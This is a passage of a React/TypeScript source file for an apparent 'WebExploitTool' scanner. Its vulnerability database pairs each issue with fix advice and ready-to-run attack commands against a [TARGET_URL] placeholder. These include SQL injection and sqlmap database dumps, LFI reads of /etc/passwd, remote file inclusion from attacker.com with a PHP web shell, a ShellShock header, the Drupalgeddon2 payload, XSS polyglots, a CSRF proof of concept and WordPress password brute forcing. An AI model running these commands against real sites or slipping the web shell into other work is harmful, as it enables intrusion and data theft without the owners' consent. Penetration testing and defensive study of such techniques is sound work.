
import React, { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Badge } from '@/components/ui/badge';
import { AlertCircle, Bug, Code, Copy, ExternalLink, RotateCcw, Search, ShieldAlert, Terminal } from 'lucide-react';
import { useToast } from '@/hooks/use-toast';
import { Skeleton } from '@/components/ui/skeleton';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Alert, AlertTitle, AlertDescription } from '@/components/ui/alert';
import { Accordion, AccordionContent, AccordionItem, AccordionTrigger } from '@/components/ui/accordion';

interface ExploitCommand {
  description: string;
  command: string;
  tool: string;
}

interface Vulnerability {
  name: string;
  description: string;
  severity: 'low' | 'medium' | 'high' | 'critical';
  recommendation: string;
  references: string[];
  category: string;
  exploitCommands?: ExploitCommand[];
}

interface ScanResult {
  url: string;
  timestamp: string;
  vulnerabilities: Vulnerability[];
  technologies: string[];
  headers?: Record<string, string>;
  openPorts?: number[];
}

// Define a union type for the pattern types
type TechPattern = 
  | { type: 'header'; key: string; value: RegExp }
  | { type: 'content'; pattern: RegExp }
  | { type: 'path'; pattern: RegExp }
  | { type: 'generator'; pattern: RegExp };

// Define the tech detection patterns interface
interface TechInfo {
  patterns: TechPattern[];
  name: string;
}

const WebExploitTool: React.FC = () => {
  const [targetUrl, setTargetUrl] = useState('');
  const [isScanning, setIsScanning] = useState(false);
  const [scanResults, setScanResults] = useState<ScanResult | null>(null);
  const [error, setError] = useState<string | null>(null);
  const { toast } = useToast();

  // Comprehensive technology detection techniques
  const techDetectionPatterns: Record<string, TechInfo> = {
    wordpress: {
      patterns: [
        { type: 'header', key: 'x-powered-by', value: /wordpress/i },
        { type: 'content', pattern: /<link[^>]*wp-content/i },
        { type: 'content', pattern: /<link[^>]*wp-includes/i },
        { type: 'content', pattern: /\/wp-content\//i },
        { type: 'content', pattern: /\/wp-includes\//i },
        { type: 'path', pattern: /\/wp-admin\/?$/i },
        { type: 'generator', pattern: /WordPress/i }
      ],
      name: 'WordPress'
    },
    php: {
      patterns: [
        { type: 'header', key: 'x-powered-by', value: /php/i },
        { type: 'header', key: 'set-cookie', value: /phpsessid/i },
        { type: 'path', pattern: /\.php$/i }
      ],
      name: 'PHP'
    },
    apache: {
      patterns: [
        { type: 'header', key: 'server', value: /apache/i }
      ],
      name: 'Apache'
    },
    nginx: {
      patterns: [
        { type: 'header', key: 'server', value: /nginx/i }
      ],
      name: 'Nginx'
    },
    jquery: {
      patterns: [
        { type: 'content', pattern: /jquery.js/i },
        { type: 'content', pattern: /jquery.min.js/i },
        { type: 'content', pattern: /\/jquery-/i }
      ],
      name: 'jQuery'
    },
    bootstrap: {
      patterns: [
        { type: 'content', pattern: /bootstrap.css/i },
        { type: 'content', pattern: /bootstrap.min.css/i },
        { type: 'content', pattern: /bootstrap.bundle.min.js/i }
      ],
      name: 'Bootstrap'
    },
    drupal: {
      patterns: [
        { type: 'content', pattern: /Drupal.settings/i },
        { type: 'content', pattern: /\/sites\/all\//i },
        { type: 'content', pattern: /\/sites\/default\//i },
        { type: 'generator', pattern: /Drupal/i }
      ],
      name: 'Drupal'
    },
    joomla: {
      patterns: [
        { type: 'content', pattern: /\/media\/jui\//i },
        { type: 'content', pattern: /\/media\/system\/js\//i },
        { type: 'generator', pattern: /Joomla/i }
      ],
      name: 'Joomla'
    },
    laravel: {
      patterns: [
        { type: 'header', key: 'set-cookie', value: /laravel_session/i },
        { type: 'content', pattern: /laravel/i }
      ],
      name: 'Laravel'
    },
    django: {
      patterns: [
        { type: 'header', key: 'set-cookie', value: /csrftoken/i },
        { type: 'header', key: 'set-cookie', value: /django/i }
      ],
      name: 'Django'
    },
    react: {
      patterns: [
        { type: 'content', pattern: /react.development.js/i },
        { type: 'content', pattern: /react.production.min.js/i },
        { type: 'content', pattern: /reactjs/i },
        { type: 'content', pattern: /_reactRoot/i }
      ],
      name: 'React'
    },
    vue: {
      patterns: [
        { type: 'content', pattern: /vue.js/i },
        { type: 'content', pattern: /vue.min.js/i },
        { type: 'content', pattern: /__vue__/i }
      ],
      name: 'Vue.js'
    },
    angular: {
      patterns: [
        { type: 'content', pattern: /angular.js/i },
        { type: 'content', pattern: /angular.min.js/i },
        { type: 'content', pattern: /ng-app/i },
        { type: 'content', pattern: /ng-controller/i }
      ],
      name: 'Angular'
    },
    aws: {
      patterns: [
        { type: 'header', key: 'server', value: /AmazonS3/i },
        { type: 'header', key: 'x-amz-request-id', value: /.+/i },
        { type: 'header', key: 'x-amz-id-2', value: /.+/i },
        { type: 'content', pattern: /aws-amplify/i }
      ],
      name: 'AWS'
    },
    cloudflare: {
      patterns: [
        { type: 'header', key: 'server', value: /cloudflare/i },
        { type: 'header', key: 'cf-ray', value: /.+/i }
      ],
      name: 'Cloudflare'
    }
  };

  // Vulnerability database with practical exploitation commands
  const vulnerabilityDatabase: Record<string, Vulnerability[]> = {
    "wordpress": [
      {
        name: "WordPress Plugin Vulnerabilities",
        description: "Many WordPress plugins contain vulnerabilities that can be exploited to gain unauthorized access or execute code.",
        severity: "high",
        recommendation: "Keep all plugins updated to the latest version and remove unused plugins. Use a security plugin to scan for vulnerable plugins.",
        references: ["https://www.exploit-db.com/search?q=wordpress+plugin", "https://wpscan.com/plugins"],
        category: "CMS",
        exploitCommands: [
          {
            description: "Scan WordPress site for vulnerable plugins",
            command: "wpscan --url [TARGET_URL] --enumerate p --api-token [API_TOKEN]",
            tool: "WPScan"
          },
          {
            description: "Check for specific plugin vulnerabilities",
            command: "wpscan --url [TARGET_URL] --plugins-detection aggressive",
            tool: "WPScan"
          },
          {
            description: "Enumerate all plugins",
            command: "wpscan --url [TARGET_URL] --enumerate ap",
            tool: "WPScan"
          },
          {
            description: "Check for vulnerable themes",
            command: "wpscan --url [TARGET_URL] --enumerate at",
            tool: "WPScan"
          },
          {
            description: "Brute force WordPress login",
            command: "wpscan --url [TARGET_URL] --usernames admin --passwords /usr/share/wordlists/rockyou.txt",
            tool: "WPScan"
          }
        ]
      },
      {
        name: "WordPress Version Disclosure",
        description: "The WordPress version is often exposed in the HTML source, RSS feeds, or readme files, which helps attackers target specific vulnerabilities.",
        severity: "low",
        recommendation: "Remove version information from the HTML and disable RSS if not needed. Edit the theme's functions.php to remove version info.",
        references: ["https://www.acunetix.com/vulnerabilities/web/wordpress-version-disclosure/"],
        category: "Information Disclosure",
        exploitCommands: [
          {
            description: "Identify WordPress version",
            command: "curl -s [TARGET_URL] | grep -o 'meta name=\"generator\" content=\"WordPress [0-9.]*\"'",
            tool: "cURL"
          },
          {
            description: "Check for readme.html to identify version",
            command: "curl -s [TARGET_URL]/readme.html | grep -o 'Version [0-9.]*'",
            tool: "cURL"
          },
          {
            description: "Check version via RSS feed",
            command: "curl -s [TARGET_URL]/feed/ | grep -o '<generator>https://wordpress.org/?v=[0-9.]*</generator>'",
            tool: "cURL"
          }
        ]
      },
      {
        name: "WordPress User Enumeration",
        description: "WordPress allows enumeration of valid usernames through ?author=N parameter or REST API.",
        severity: "medium",
        recommendation: "Use security plugins to disable author scanning and restrict REST API user endpoints.",
        references: ["https://www.wordfence.com/blog/2017/10/username-enumeration/"],
        category: "Information Disclosure",
        exploitCommands: [
          {
            description: "Enumerate users through author parameter",
            command: "for i in $(seq 1 10); do curl -s -I \"[TARGET_URL]/?author=$i\" | grep -i location; done",
            tool: "cURL"
          },
          {
            description: "Enumerate users through REST API",
            command: "curl -s \"[TARGET_URL]/wp-json/wp/v2/users\"",
            tool: "cURL"
          },
          {
            description: "Get users with WPScan",
            command: "wpscan --url [TARGET_URL] --enumerate u",
            tool: "WPScan"
          },
          {
            description: "Check user posts for information",
            command: "curl -s \"[TARGET_URL]/?author=1\"",
            tool: "cURL"
          }
        ]
      },
      {
        name: "WordPress XMLRPC Vulnerabilities",
        description: "XML-RPC interface in WordPress can be abused for brute force attacks, DDoS, or information disclosure.",
        severity: "high",
        recommendation: "Disable XML-RPC if not needed or limit access with firewall rules.",
        references: ["https://blog.sucuri.net/2015/10/brute-force-amplification-attacks-against-wordpress-xmlrpc.html"],
        category: "API Security",
        exploitCommands: [
          {
            description: "Check if XMLRPC is enabled",
            command: "curl -d \"<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>\" -X POST [TARGET_URL]/xmlrpc.php",
            tool: "cURL"
          },
          {
            description: "Test pingback vulnerability (potential DDoS)",
            command: "curl -X POST [TARGET_URL]/xmlrpc.php -d '<methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://attacker.com</string></value></param><param><value><string>[TARGET_URL]</string></value></param></params></methodCall>'",
            tool: "cURL"
          },
          {
            description: "Attempt brute force via XML-RPC",
            command: "curl -X POST [TARGET_URL]/xmlrpc.php -d '<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>password</value></param></params></methodCall>'",
            tool: "cURL"
          }
        ]
      }
    ],
    "php": [
      {
        name: "PHP Injection",
        description: "User input is not properly sanitized before being used in PHP functions like eval(), allowing code execution.",
        severity: "critical",
        recommendation: "Never use eval() with user input and properly sanitize all inputs. Use prepared statements for database queries.",
        references: ["https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection"],
        category: "Injection",
        exploitCommands: [
          {
            description: "Test for PHP code injection in parameter",
            command: "curl -s \"[TARGET_URL]/page.php?param=phpinfo()\"",
            tool: "cURL"
          },
          {
            description: "Test for PHP object injection",
            command: "curl -s \"[TARGET_URL]/page.php\" -d \"data=O:8:\\\"stdClass\\\":1:{s:3:\\\"cmd\\\";s:10:\\\"phpinfo();\\\"}\"",
            tool: "cURL"
          },
          {
            description: "Test for PHP command injection",
            command: "curl -s \"[TARGET_URL]/page.php?cmd=ls%20-la\"",
            tool: "cURL"
          },
          {
            description: "Test PHP injection with system functions",
            command: "curl -s \"[TARGET_URL]/page.php?param=system('id')\"",
            tool: "cURL"
          },
          {
            description: "Test PHP injection with passthru",
            command: "curl -s \"[TARGET_URL]/page.php?param=passthru('cat%20/etc/passwd')\"",
            tool: "cURL"
          }
        ]
      },
      {
        name: "Local File Inclusion (LFI)",
        description: "Improper validation of file paths can allow attackers to include local files, potentially exposing sensitive information.",
        severity: "high",
        recommendation: "Validate and sanitize file paths, use whitelists for file inclusion, avoid dynamic file includes.",
        references: ["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion"],
        category: "File Inclusion",
        exploitCommands: [
          {
            description: "Test for LFI vulnerability - Unix",
            command: "curl -s \"[TARGET_URL]/page.php?file=../../../etc/passwd\"",
            tool: "cURL"
          },
          {
            description: "Test for LFI with PHP filter wrapper",
            command: "curl -s \"[TARGET_URL]/page.php?file=php://filter/convert.base64-encode/resource=index.php\"",
            tool: "cURL"
          },
          {
            description: "Test for LFI - Windows",
            command: "curl -s \"[TARGET_URL]/page.php?file=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts\"",
            tool: "cURL"
          },
          {
            description: "Test for LFI with data wrapper",
            command: "curl -s \"[TARGET_URL]/page.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==\"",
            tool: "cURL"
          },
          {
            description: "Test for LFI with null byte injection (older PHP)",
            command: "curl -s \"[TARGET_URL]/page.php?file=../../../etc/passwd%00\"",
            tool: "cURL"
          },
          {
            description: "Use LFI Scanner tool",
            command: "lfisuite -u \"[TARGET_URL]/page.php?file=INJECTME\"",
            tool: "LFISuite"
          }
        ]
      },
      {
        name: "Remote File Inclusion (RFI)",
        description: "PHP applications may include remote files, allowing attackers to include malicious code from external sources.",
        severity: "critical",
        recommendation: "Disable allow_url_include in php.ini, validate file paths, implement proper input sanitization.",
        references: ["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion"],
        category: "File Inclusion",
        exploitCommands: [
          {
            description: "Test for RFI vulnerability",
            command: "curl -s \"[TARGET_URL]/page.php?file=http://attacker.com/malicious.php\"",
            tool: "cURL"
          },
          {
            description: "Test RFI with direct PHP code",
            command: "curl -s \"[TARGET_URL]/page.php?file=data:text/plain,<?php phpinfo(); ?>\"",
            tool: "cURL"
          },
          {
            description: "Create and host malicious PHP file",
            command: "echo '<?php system($_GET[\"cmd\"]); ?>' > evil.php && python -m http.server 8000",
            tool: "Command Line"
          },
          {
            description: "Execute commands via RFI",
            command: "curl -s \"[TARGET_URL]/page.php?file=http://attacker.com:8000/evil.php&cmd=id\"",
            tool: "cURL"
          }
        ]
      },
      {
        name: "PHP Type Juggling Vulnerabilities",
        description: "Loose comparison in PHP (==) can lead to authentication bypass or logic flaws.",
        severity: "high",
        recommendation: "Use strict comparison (===) when comparing values, especially in security contexts.",
        references: ["https://www.owasp.org/images/6/6b/PHPMagicTricks-TypeJuggling.pdf"],
        category: "Logic Flaws",
        exploitCommands: [
          {
            description: "Test for hash type juggling (Magic Hashes)",
            command: "curl -s \"[TARGET_URL]/login.php\" -d \"username=admin&password=240610708\" -H \"Content-Type: application/x-www-form-urlencoded\"",
            tool: "cURL"
          },
          {
            description: "Test for string to number comparison flaw",
            command: "curl -s \"[TARGET_URL]/verify.php\" -d \"token=0e12345\" -H \"Content-Type: application/x-www-form-urlencoded\"",
            tool: "cURL"
          },
          {
            description: "Test for true/false conversion",
            command: "curl -s \"[TARGET_URL]/admin.php\" -d \"authorized=true\" -H \"Content-Type: application/x-www-form-urlencoded\"",
            tool: "cURL"
          }
        ]
      }
    ],
    "apache": [
      {
        name: "Apache Server Information Disclosure",
        description: "Apache server might reveal version information in HTTP headers, helping attackers target specific vulnerabilities.",
        severity: "low",
        recommendation: "Configure Apache to hide version information in HTTP headers by setting ServerTokens Prod and ServerSignature Off in httpd.conf.",
        references: ["https://www.acunetix.com/vulnerabilities/web/apache-server-information-disclosure/"],
        category: "Information Disclosure",
        exploitCommands: [
          {
            description: "Get server information from headers",
            command: "curl -s -I [TARGET_URL] | grep -i \"server:\"",
            tool: "cURL"
          },
          {
            description: "Check for server status page",
            command: "curl -s [TARGET_URL]/server-status",
            tool: "cURL"
          },
          {
            description: "Check for server info page",
            command: "curl -s [TARGET_URL]/server-info",
            tool: "cURL"
          }
        ]
      },
      {
        name: "Apache Directory Listing",
        description: "Improperly configured Apache servers may allow directory listing, exposing sensitive files and information.",
        severity: "medium",
        recommendation: "Disable directory listing by adding 'Options -Indexes' to your Apache configuration.",
        references: ["https://www.acunetix.com/vulnerabilities/web/directory-listing/"],
        category: "Information Disclosure",
        exploitCommands: [
          {
            description: "Check for directory listing",
            command: "curl -s [TARGET_URL]/images/",
            tool: "cURL"
          },
          {
            description: "Check common directories for listing",
            command: "for dir in css js images uploads backup includes admin; do curl -s -o /dev/null -w \"%{http_code} - $dir\\n\" [TARGET_URL]/$dir/; done",
            tool: "cURL"
          },
          {
            description: "Use dirb for automated discovery",
            command: "dirb [TARGET_URL] /usr/share/dirb/wordlists/common.txt",
            tool: "dirb"
          },
          {
            description: "Use dirsearch for content discovery",
            command: "dirsearch -u [TARGET_URL] -e php,html,js,zip,bak",
            tool: "dirsearch"
          }
        ]
      },
      {
        name: "Apache mod_cgi Vulnerabilities",
        description: "CGI scripts in Apache can be vulnerable to various attacks including command injection and information disclosure.",
        severity: "high",
        recommendation: "Disable CGI if not needed, ensure proper permissions, validate all inputs to CGI scripts.",
        references: ["https://httpd.apache.org/docs/2.4/mod/mod_cgi.html"],
        category: "Server Configuration",
        exploitCommands: [
          {
            description: "Check for CGI scripts",
            command: "curl -s [TARGET_URL]/cgi-bin/",
            tool: "cURL"
          },
          {
            description: "Test for ShellShock vulnerability",
            command: "curl -H \"User-Agent: () { :; }; echo; echo; /bin/bash -c 'echo vulnerable to shellshock'\" [TARGET_URL]/cgi-bin/test.cgi",
            tool: "cURL"
          },
          {
            description: "Scan for CGI vulnerabilities",
            command: "nikto -host [TARGET_URL] -Tuning 5",
            tool: "Nikto"
          }
        ]
      }
    ],
    "nginx": [
      {
        name: "Nginx Misconfiguration",
        description: "Misconfigured Nginx can lead to path traversal or information disclosure, especially in location blocks.",
        severity: "medium",
        recommendation: "Review and harden Nginx configuration, especially location blocks. Use 'alias' directives carefully.",
        references: ["https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/"],
        category: "Misconfiguration",
        exploitCommands: [
          {
            description: "Test for Nginx alias traversal",
            command: "curl -s \"[TARGET_URL]/static../\"",
            tool: "cURL"
          },
          {
            description: "Check for Nginx status page",
            command: "curl -s [TARGET_URL]/nginx_status",
            tool: "cURL"
          },
          {
            description: "Test for NGINX CRLF injection",
            command: "curl -s \"[TARGET_URL]/%0D%0AX-Injected: header-value\"",
            tool: "cURL"
          },
          {
            description: "Check off-by-slash vulnerability",
            command: "curl -s \"[TARGET_URL]/folder/./\"",
            tool: "cURL"
          }
        ]
      },
      {
        name: "Nginx SSI Injection",
        description: "Server-Side Includes (SSI) in Nginx can be exploited if user input is improperly handled.",
        severity: "high",
        recommendation: "Disable SSI if not needed, or validate all user inputs before including them in SSI directives.",
        references: ["https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection"],
        category: "Injection",
        exploitCommands: [
          {
            description: "Test for SSI injection",
            command: "curl -s \"[TARGET_URL]/page?param=<!--#exec cmd=\\\"id\\\" -->\"",
            tool: "cURL"
          },
          {
            description: "Check if SSI is enabled",
            command: "curl -s -o /dev/null -w \"%{http_code}\" \"[TARGET_URL]/<!--#echo var=\\\"DATE_LOCAL\\\" -->\"",
            tool: "cURL"
          }
        ]
      }
    ],
    "jquery": [
      {
        name: "Outdated jQuery",
        description: "Old versions of jQuery may contain XSS vulnerabilities or prototype pollution issues.",
        severity: "medium",
        recommendation: "Update to the latest version of jQuery. Check CDN sources and local copies.",
        references: ["https://snyk.io/blog/after-three-years-of-silence-a-new-jquery-prototype-pollution-vulnerability-emerges-once-again/"],
        category: "Client-Side",
        exploitCommands: [
          {
            description: "Check jQuery version",
            command: "curl -s [TARGET_URL] | grep -o 'jquery[.-][0-9.]*\\.min\\.js'",
            tool: "cURL"
          },
          {
            description: "Scan for jQuery vulnerabilities",
            command: "retire --js --outputformat json --path [TARGET_URL]",
            tool: "RetireJS"
          },
          {
            description: "Check jQuery version with browser console",
            command: "console.log(jQuery.fn.jquery);",
            tool: "Browser Console"
          }
        ]
      },
      {
        name: "jQuery XSS via DOM Manipulation",
        description: "jQuery's methods for DOM manipulation can lead to XSS if user input is used.",
        severity: "high",
        recommendation: "Sanitize all user inputs before using them with jQuery methods like .html(), .append(), etc.",
        references: ["https://cheatsheetseries.owasp.org/cheatsheets/jQuery_Cheat_Sheet.html"],
        category: "Client-Side",
        exploitCommands: [
          {
            description: "Test for DOM XSS with URL parameter",
            command: "Open [TARGET_URL]/?q=<img src=x onerror=alert(1)>",
            tool: "Browser"
          },
          {
            description: "Check for vulnerable jQuery functions",
            command: "curl -s [TARGET_URL] | grep -E '\\.html\\(|\\$\\(.*\\)\\.(html|append|prepend)\\('",
            tool: "cURL"
          }
        ]
      }
    ],
    "bootstrap": [
      {
        name: "Bootstrap Version Vulnerabilities",
        description: "Older versions of Bootstrap may contain security issues, including XSS in certain components.",
        severity: "low",
        recommendation: "Update to the latest version of Bootstrap. Check CDN sources and local copies.",
        references: ["https://getbootstrap.com/docs/5.0/getting-started/browsers-devices/#:~:text=Bootstrap%20supports%20the%20latest%2C%20stable,Internet%20Explorer%2010%20and%20up."],
        category: "Client-Side",
        exploitCommands: [
          {
            description: "Check Bootstrap version",
            command: "curl -s [TARGET_URL] | grep -o 'bootstrap[.-][0-9.]*\\.min\\.css'",
            tool: "cURL"
          },
          {
            description: "Scan for Bootstrap vulnerabilities",
            command: "retire --js --outputformat json --path [TARGET_URL]",
            tool: "RetireJS"
          }
        ]
      }
    ],
    "drupal": [
      {
        name: "Drupal Core Vulnerabilities",
        description: "Drupal has had several critical vulnerabilities including 'Drupalgeddon' that allow remote code execution.",
        severity: "critical",
        recommendation: "Keep Drupal core and modules up to date, apply security patches immediately.",
        references: ["https://www.drupal.org/security"],
        category: "CMS",
        exploitCommands: [
          {
            description: "Check Drupal version",
            command: "curl -s [TARGET_URL]/CHANGELOG.txt | head -n 10",
            tool: "cURL"
          },
          {
            description: "Test for Drupalgeddon2 (CVE-2018-7600)",
            command: "curl -s \"[TARGET_URL]/?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=id\"",
            tool: "cURL"
          },
          {
            description: "Enumerate Drupal users",
            command: "curl -s \"[TARGET_URL]/?q=user/1\"",
            tool: "cURL"
          },
          {
            description: "Check for module update status",
            command: "curl -s \"[TARGET_URL]/admin/reports/updates\"",
            tool: "cURL"
          }
        ]
      }
    ],
    "joomla": [
      {
        name: "Joomla Core Vulnerabilities",
        description: "Joomla has had several critical vulnerabilities including SQL injection and remote code execution.",
        severity: "high",
        recommendation: "Keep Joomla core and extensions up to date, apply security patches immediately.",
        references: ["https://developer.joomla.org/security-centre.html"],
        category: "CMS",
        exploitCommands: [
          {
            description: "Check Joomla version",
            command: "curl -s [TARGET_URL]/administrator/manifests/files/joomla.xml | grep -o \"<version>.*</version>\"",
            tool: "cURL"
          },
          {
            description: "Enumerate Joomla users",
            command: "curl -s \"[TARGET_URL]/index.php?option=com_users\"",
            tool: "cURL"
          },
          {
            description: "Check for common vulnerable components",
            command: "for comp in com_content com_contact com_banners com_finder com_tags com_contenthistory; do curl -s -o /dev/null -w \"$comp: %{http_code}\\n\" \"[TARGET_URL]/index.php?option=$comp\"; done",
            tool: "cURL"
          },
          {
            description: "Use Joomscan for comprehensive analysis",
            command: "joomscan --url [TARGET_URL]",
            tool: "Joomscan"
          }
        ]
      }
    ],
    "general": [
      {
        name: "Cross-Site Scripting (XSS)",
        description: "User input is not properly sanitized before being displayed on the page, allowing attackers to inject and execute malicious scripts.",
        severity: "high",
        recommendation: "Implement proper input validation and output encoding. Use Content-Security-Policy headers and modern frameworks with built-in XSS protection.",
        references: ["https://owasp.org/www-community/attacks/xss/"],
        category: "Injection",
        exploitCommands: [
          {
            description: "Test for Reflected XSS",
            command: "curl -s \"[TARGET_URL]/page.php?param=<script>alert('XSS')</script>\"",
            tool: "cURL"
          },
          {
            description: "Test with XSS payload via form",
            command: "curl -s \"[TARGET_URL]/form.php\" -d \"input=<img src=x onerror=alert('XSS')>\"",
            tool: "cURL"
          },
          {
            description: "Test for DOM-based XSS",
            command: "Open [TARGET_URL]/#<img src=x onerror=alert(1)>",
            tool: "Browser"
          },
          {
            description: "Use XSS polyglot payload",
            command: "curl -s \"[TARGET_URL]/page.php?param=jaVasCript:/*-/*`/*\\`/*'/*\\\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\"",
            tool: "cURL"
          },
          {
            description: "Use XSS scanner",
            command: "xsser --url \"[TARGET_URL]/page.php?param=INJECT\" --auto",
            tool: "XSSer"
          },
          {
            description: "Test various XSS payloads using custom tool",
            command: "python3 xsstrike.py -u \"[TARGET_URL]/page.php?param=FUZZ\"",
            tool: "XSStrike"
          }
        ]
      },
      {
        name: "SQL Injection",
        description: "User input is not properly sanitized before being used in SQL queries, allowing attackers to manipulate database queries.",
        severity: "critical",
        recommendation: "Use parameterized queries or prepared statements. Apply the principle of least privilege for database users.",
        references: ["https://owasp.org/www-community/attacks/SQL_Injection"],
        category: "Injection",
        exploitCommands: [
          {
            description: "Test for SQL injection in parameter",
            command: "curl -s \"[TARGET_URL]/page.php?id=1' OR '1'='1\"",
            tool: "cURL"
          },
          {
            description: "Use sqlmap for automated SQL injection",
            command: "sqlmap -u \"[TARGET_URL]/page.php?id=1\" --batch --dbs",
            tool: "SQLMap"
          },
          {
            description: "Test for blind SQL injection",
            command: "curl -s \"[TARGET_URL]/page.php?id=1 AND SLEEP(5)\"",
            tool: "cURL"
          },
          {
            description: "Dump database tables with SQLMap",
            command: "sqlmap -u \"[TARGET_URL]/page.php?id=1\" --batch --tables",
            tool: "SQLMap"
          },
          {
            description: "Dump specific table data",
            command: "sqlmap -u \"[TARGET_URL]/page.php?id=1\" --batch -D database_name -T users --dump",
            tool: "SQLMap"
          },
          {
            description: "Test for SQL injection in forms",
            command: "sqlmap -u \"[TARGET_URL]/login.php\" --data=\"username=test&password=test\" --batch",
            tool: "SQLMap"
          },
          {
            description: "Test for time-based blind SQL injection",
            command: "sqlmap -u \"[TARGET_URL]/page.php?id=1\" --batch --technique=T",
            tool: "SQLMap"
          },
          {
            description: "Test for UNION-based SQL injection",
            command: "curl -s \"[TARGET_URL]/page.php?id=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10-- -\"",
            tool: "cURL"
          }
        ]
      },
      {
        name: "Cross-Site Request Forgery (CSRF)",
        description: "The application doesn't validate that requests are intentionally made by the user, allowing attackers to trick users into performing unwanted actions.",
        severity: "high",
        recommendation: "Implement anti-CSRF tokens for all state-changing operations. Use SameSite cookie attribute.",
        references: ["https://owasp.org/www-community/attacks/csrf"],
        category: "Session Management",
        exploitCommands: [
          {
            description: "Check for missing CSRF tokens",
            command: "curl -s -X POST \"[TARGET_URL]/user/profile\" -d \"email=test@example.com\"",
            tool: "cURL"
          },
          {
            description: "Create CSRF PoC",
            command: "echo '<html><body><form action=\"[TARGET_URL]/user/profile\" method=\"POST\" id=\"exploit\"><input type=\"hidden\" name=\"email\" value=\"hacker@evil.com\"/></form><script>document.getElementById(\"exploit\").submit();</script></body></html>' > csrf.html",
            tool: "Command Line"
          },
          {
            description: "Test for SameSite cookie attribute",
            command: "curl -s -I [TARGET_URL] | grep -i \"set-cookie\"",
            tool: "cURL"
          }
        ]
      },
      {
        name: "Insecure Direct Object References (IDOR)",
        description: "The application exposes references to internal objects, allowing unauthorized access to other users' data or functionality.",
        severity: "high",
        recommendation: "Implement proper access controls and use indirect references. Validate all user-controlled IDs against the authenticated user.",
        references: ["https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html"],
        category: "Access Control",
        exploitCommands: [
          {
            description: "Test for IDOR in user profiles",
            command: "curl -s \"[TARGET_URL]/profile?id=2\" -H \"Cookie: session=YOUR_SESSION_COOKIE\"",
            tool: "cURL"
          },
          {
            description: "Test for IDOR in API endpoints",
            command: "curl -s \"[TARGET_URL]/api/users/2\" -H \"Authorization: Bearer YOUR_TOKEN\"",
            tool: "cURL"
          },
          {
            description: "Enumerate multiple IDs",
            command: "for id in {1..10}; do curl -s -o /dev/null -w \"ID $id: %{http_code}\\n\" \"[TARGET_URL]/document?id=$id\" -H \"Cookie: session=YOUR_SESSION_COOKIE\"; done",
            tool: "cURL"
          },
          {
            description: "Test IDOR with different HTTP methods",
            command: "curl -s -X PUT \"[TARGET_URL]/api/users/2\" -H \"Authorization: Bearer YOUR_TOKEN\" -d '{\"email\":\"test@example.com\"}'",
            tool: "cURL"
          }
        ]
      },
      {
        name: "Security Misconfiguration",
        description: "The application may have default configurations, unnecessary features, or informative error messages that can be exploited.",
        severity: "medium",
        recommendation: "Implement a proper security configuration and harden server settings. Follow the principle of least privilege.",
        references: ["https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration"],
        category: "Misconfiguration",
        exploitCommands: [
          {
            description: "Check for default pages/dirs",
            command: "curl -s -I \"[TARGET_URL]/admin/\" \"[TARGET_URL]/phpinfo.php\" \"[TARGET_URL]/setup/\"",
            tool: "cURL"
          },
          {
            description: "Check for error messages",
            command: "curl -s \"[TARGET_URL]/nonexistent_page.php\"",
            tool: "cURL"
          },
          {
            description: "Check HTTP security headers",
            command: "curl -s -I [TARGET_URL] | grep -i \"x-\\|content-security\\|strict-transport\"",
            tool: "cURL"
          },
          {
            description: "Use scanner for misconfigurations",
            command: "nikto -host [TARGET_URL]",
            tool: "Nikto"
          },
          {
            description: "Check for robots.txt",
            command: "curl -s [TARGET_URL]/robots.txt",
            tool: "cURL"
          },
          {
            description: "Check for open .git directory",
            command: "curl -s [TARGET_URL]/.git/",
            tool: "cURL"
          },
          {
            description: "Scan for common misconfigurations",
            command: "nuclei -u [TARGET_URL] -t nuclei-templates/misconfiguration/",
            tool: "Nuclei"
          }
        ]
      },
      {
        name: "Sensitive Data Exposure",
        description: "Applications may improperly protect sensitive data such as financial, healthcare, or PII information.",
        severity: "high",
        recommendation: "Encrypt sensitive data at rest and in transit. Use HTTPS for all connections and implement proper key management.",
        references: ["https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure"],
        category: "Data Protection",
        exploitCommands: [
          {
            description: "Check for sensitive data in robots.txt",
            command: "curl -s \"[TARGET_URL]/robots.txt\"",
            tool: "cURL"
          },
          {
            description: "Check for sensitive backup files",
            command: "curl -s -I \"[TARGET_URL]/config.php.bak\" \"[TARGET_URL]/.env\" \"[TARGET_URL]/db.sql\"",
            tool: "cURL"
          },
          {
            description: "Check HTTPS implementation",
            command: "curl -s -I https://[TARGET_DOMAIN] | grep -i \"strict-transport-security\"",
            tool: "cURL"
          },
          {
            description: "Check for .git directory",
            command: "curl -s [TARGET_URL]/.git/config",
            tool: "cURL"
          },
          {
            description: "Dump .git directory if exposed",
            command: "git-dumper [TARGET_URL]/.git output_dir",
            tool: "git-dumper"
          },
          {
            description: "Check for common password files",
            command: "curl -s -I \"[TARGET_URL]/passwords.txt\" \"[TARGET_URL]/credentials.txt\" \"[TARGET_URL]/users.txt\"",
            tool: "cURL"
          },
          {
            description: "Scan for exposed secrets",
            command: "nuclei -u [TARGET_URL] -t nuclei-templates/exposures/",
            tool: "Nuclei"
          }
        ]
